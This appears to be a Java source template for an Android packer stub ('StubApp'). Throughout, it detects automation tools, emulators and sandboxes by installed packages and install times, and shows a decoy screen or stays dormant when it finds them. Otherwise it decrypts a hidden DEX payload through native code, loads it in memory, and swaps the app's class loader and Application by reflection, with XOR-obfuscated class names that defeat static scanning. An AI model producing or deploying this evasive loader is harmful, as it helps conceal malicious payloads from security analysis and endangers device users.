package STUB_PACKAGE_PLACEHOLDER;

import android.app.Application;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.ref.WeakReference;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.List;

public class StubApp extends Application {
    static {
        try { System.loadLibrary("DEXLDR_LIBNAME_PLACEHOLDER"); } catch (Throwable ignored) {}
    }

    private native byte[] nativeUnpack();
    private native int LITE_CHECK_SYMBOL_PLACEHOLDER();

    private Application realApp = null;

    private static String x(byte[] b) {
        byte[] r = new byte[b.length];
        for (int i = 0; i < b.length; i++) r[i] = (byte)(b[i] ^ STUB_XOR_KEY_PLACEHOLDER);
        return new String(r);
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);

        boolean botPkg   = hasBotPackage(base);
        boolean fewApps  = !botPkg && isTooFewUserApps(base);
        boolean suspTime = !botPkg && !fewApps && isSuspiciousInstallTimes(base);

        int liteResult = 0;
        if (!botPkg && !fewApps && !suspTime) {
            try { liteResult = LITE_CHECK_SYMBOL_PLACEHOLDER(); } catch (Throwable ignored) {}
        }

        if (botPkg || fewApps || suspTime) return;

        if (liteResult != 0) {
            if (liteResult != 3) {
                try {
                    android.content.Intent di = new android.content.Intent();
                    di.setClassName(base.getPackageName(), "STUB_DECOY_FQN_PLACEHOLDER");
                    di.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                              | android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK);
                    base.startActivity(di);
                } catch (Throwable ignored) {}
            }
            return;
        }

        try {
            byte[] dexBytes = nativeUnpack();
            if (dexBytes == null || dexBytes.length < 32) return;

            ClassLoader parentCl = getClassLoader();
            ClassLoader newCl;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                // "dalvik.system.InMemoryDexClassLoader" — via reflection, not in DEX type_ids
                Class<?> imdcl = Class.forName(x(new byte[]{62,59,54,44,51,49,116,41,35,41,46,63,55,116,19,52,23,63,55,53,40,35,30,63,34,25,54,59,41,41,22,53,59,62,63,40}));
                Constructor<?> ictor = imdcl.getConstructor(ByteBuffer.class, ClassLoader.class);
                newCl = (ClassLoader) ictor.newInstance(ByteBuffer.wrap(dexBytes), parentCl);
            } else {
                File dexFile = new File(base.getCacheDir(), ".dx");
                FileOutputStream fos = new FileOutputStream(dexFile);
                fos.write(dexBytes); fos.close();
                File optDir = new File(base.getCacheDir(), ".dxopt"); optDir.mkdirs();
                // "dalvik.system.DexClassLoader" — via reflection, not in DEX type_ids
                Class<?> dcl = Class.forName(x(new byte[]{62,59,54,44,51,49,116,41,35,41,46,63,55,116,30,63,34,25,54,59,41,41,22,53,59,62,63,40}));
                Constructor<?> dctor = dcl.getConstructor(String.class, String.class, String.class, ClassLoader.class);
                newCl = (ClassLoader) dctor.newInstance(dexFile.getAbsolutePath(), optDir.getAbsolutePath(), null, parentCl);
            }

            copyNativeLibDirs(parentCl, newCl);
            swapClassLoader(base, newCl);

            Class<?> realCls = newCl.loadClass("REAL_APP_FQN_PLACEHOLDER");
            Application app = (Application) realCls.getDeclaredConstructor().newInstance();
            Method attach = android.content.ContextWrapper.class
                .getDeclaredMethod("attachBaseContext", Context.class);
            attach.setAccessible(true);
            attach.invoke(app, base);
            swapApp(base, app);
            this.realApp = app;
        } catch (Throwable ignored) {}
    }

    @Override public void onCreate() {
        super.onCreate();
        if (realApp != null) { try { realApp.onCreate(); } catch (Throwable ignored) {} }
    }
    @Override public void onTerminate() {
        if (realApp != null) { try { realApp.onTerminate(); } catch (Throwable ignored) {} }
        super.onTerminate();
    }
    @Override public void onLowMemory() {
        if (realApp != null) { try { realApp.onLowMemory(); } catch (Throwable ignored) {} }
        super.onLowMemory();
    }
    @Override public void onTrimMemory(int level) {
        if (realApp != null) { try { realApp.onTrimMemory(level); } catch (Throwable ignored) {} }
        super.onTrimMemory(level);
    }

    private static boolean isTooFewUserApps(Context ctx) {
        int count = 0;
        try {
            for (PackageInfo pi : ctx.getPackageManager().getInstalledPackages(0)) {
                ApplicationInfo ai = pi.applicationInfo; if (ai == null) continue;
                boolean sys = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                boolean upd = (ai.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
                if (!sys && !upd && !pi.packageName.equals(ctx.getPackageName())) {
                    if (++count > 6) return false;
                }
            }
        } catch (Exception ignored) {}
        return count <= 6;
    }

    private static boolean isSuspiciousInstallTimes(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            long tSys  = pm.getPackageInfo("com.android.settings", 0).firstInstallTime;
            long tBoot = System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime();
            if (Math.abs(tSys - tBoot) < 10L * 60 * 1000) return true;
            List<PackageInfo> pkgs = pm.getInstalledPackages(0);
            int userCount = 0, clonedCount = 0;
            for (PackageInfo pi : pkgs) {
                ApplicationInfo ai = pi.applicationInfo; if (ai == null) continue;
                boolean sys = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                boolean upd = (ai.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
                if (sys || upd || pi.packageName.equals(ctx.getPackageName())) continue;
                userCount++;
                if (pi.firstInstallTime - tSys > 30L * 60 * 1000) return false;
                if (Math.abs(pi.firstInstallTime - tSys) < 5L * 60 * 1000) clonedCount++;
            }
            return userCount > 0 && clonedCount == userCount;
        } catch (Exception ignored) { return false; }
    }

    private static boolean hasBotPackage(android.content.Context ctx) {
        String[] pkgs = {
            "com.google.android.apps" + ".auth.test.support",
            "io.appium" + ".settings",
            "io.appium.uiautomator2" + ".server",
            "com.android" + ".developer.ext",
            "com.github.uiautomator" + ".test"
        };
        for (String pkg : pkgs) {
            try { ctx.getPackageManager().getPackageInfo(pkg, 0); return true; }
            catch (Exception ignored) {}
        }
        return false;
    }

    private static void copyNativeLibDirs(ClassLoader src, ClassLoader dst) {
        try {
            // "dalvik.system.BaseDexClassLoader"
            Class<?> base = Class.forName(x(new byte[]{62, 59, 54, 44, 51, 49, 116, 41, 35, 41, 46, 63, 55, 116, 24, 59, 41, 63, 30, 63, 34, 25, 54, 59, 41, 41, 22, 53, 59, 62, 63, 40}));
            // "pathList"
            Field plF = base.getDeclaredField(x(new byte[]{42, 59, 46, 50, 22, 51, 41, 46}));
            plF.setAccessible(true);
            Object spl = plF.get(src), dpl = plF.get(dst);
            if (spl == null || dpl == null) return;
            // "nativeLibraryDirectories", "systemNativeLibraryDirectories"
            for (String fn : new String[]{
                x(new byte[]{52, 59, 46, 51, 44, 63, 22, 51, 56, 40, 59, 40, 35, 30, 51, 40, 63, 57, 46, 53, 40, 51, 63, 41}),
                x(new byte[]{41, 35, 41, 46, 63, 55, 20, 59, 46, 51, 44, 63, 22, 51, 56, 40, 59, 40, 35, 30, 51, 40, 63, 57, 46, 53, 40, 51, 63, 41})
            }) {
                try {
                    Field f = spl.getClass().getDeclaredField(fn);
                    f.setAccessible(true); f.set(dpl, f.get(spl));
                } catch (NoSuchFieldException ignored) {}
            }
            // "nativeLibraryPathElements"
            try {
                Field ef = spl.getClass().getDeclaredField(x(new byte[]{52, 59, 46, 51, 44, 63, 22, 51, 56, 40, 59, 40, 35, 10, 59, 46, 50, 31, 54, 63, 55, 63, 52, 46, 41}));
                ef.setAccessible(true); ef.set(dpl, ef.get(spl));
            } catch (NoSuchFieldException ignored) {}
        } catch (Throwable ignored) {}
    }

    private static void swapClassLoader(Context ctx, ClassLoader newCl) throws Exception {
        // "android.app.ActivityThread"
        Class<?> at = Class.forName(x(new byte[]{59, 52, 62, 40, 53, 51, 62, 116, 59, 42, 42, 116, 27, 57, 46, 51, 44, 51, 46, 35, 14, 50, 40, 63, 59, 62}));
        // "currentActivityThread"
        Object t = at.getMethod(x(new byte[]{57, 47, 40, 40, 63, 52, 46, 27, 57, 46, 51, 44, 51, 46, 35, 14, 50, 40, 63, 59, 62})).invoke(null);
        // "mPackages"
        Field pf = at.getDeclaredField(x(new byte[]{55, 10, 59, 57, 49, 59, 61, 63, 41})); pf.setAccessible(true);
        Object pkgs = pf.get(t);
        Object ref = pkgs.getClass().getMethod("get", Object.class).invoke(pkgs, ctx.getPackageName());
        if (ref == null) return;
        Object la = (ref instanceof WeakReference) ? ((WeakReference<?>) ref).get() : ref;
        if (la == null) return;
        // "mClassLoader"
        Field cf = la.getClass().getDeclaredField(x(new byte[]{55, 25, 54, 59, 41, 41, 22, 53, 59, 62, 63, 40}));
        cf.setAccessible(true); cf.set(la, newCl);
    }

    @SuppressWarnings("unchecked")
    private static void swapApp(Context ctx, Application app) throws Exception {
        // "android.app.ActivityThread"
        Class<?> at = Class.forName(x(new byte[]{59, 52, 62, 40, 53, 51, 62, 116, 59, 42, 42, 116, 27, 57, 46, 51, 44, 51, 46, 35, 14, 50, 40, 63, 59, 62}));
        // "currentActivityThread"
        Object t = at.getMethod(x(new byte[]{57, 47, 40, 40, 63, 52, 46, 27, 57, 46, 51, 44, 51, 46, 35, 14, 50, 40, 63, 59, 62})).invoke(null);
        // "mInitialApplication"
        Field iF = at.getDeclaredField(x(new byte[]{55, 19, 52, 51, 46, 51, 59, 54, 27, 42, 42, 54, 51, 57, 59, 46, 51, 53, 52}));
        iF.setAccessible(true); iF.set(t, app);
        try {
            // "mAllApplications"
            Field aF = at.getDeclaredField(x(new byte[]{55, 27, 54, 54, 27, 42, 42, 54, 51, 57, 59, 46, 51, 53, 52, 41}));
            aF.setAccessible(true);
            List<Application> all = (List<Application>) aF.get(t);
            if (all != null && !all.contains(app)) all.add(app);
        } catch (NoSuchFieldException ignored) {}
        try {
            // "mPackages"
            Field pF = at.getDeclaredField(x(new byte[]{55, 10, 59, 57, 49, 59, 61, 63, 41})); pF.setAccessible(true);
            Object pkgs = pF.get(t);
            Object ref = pkgs.getClass().getMethod("get", Object.class).invoke(pkgs, ctx.getPackageName());
            Object la = (ref instanceof WeakReference) ? ((WeakReference<?>) ref).get() : ref;
            if (la != null) {
                // "mApplication"
                Field apF = la.getClass().getDeclaredField(x(new byte[]{55, 27, 42, 42, 54, 51, 57, 59, 46, 51, 53, 52}));
                apF.setAccessible(true); apF.set(la, app);
            }
        } catch (Throwable ignored) {}
    }
}
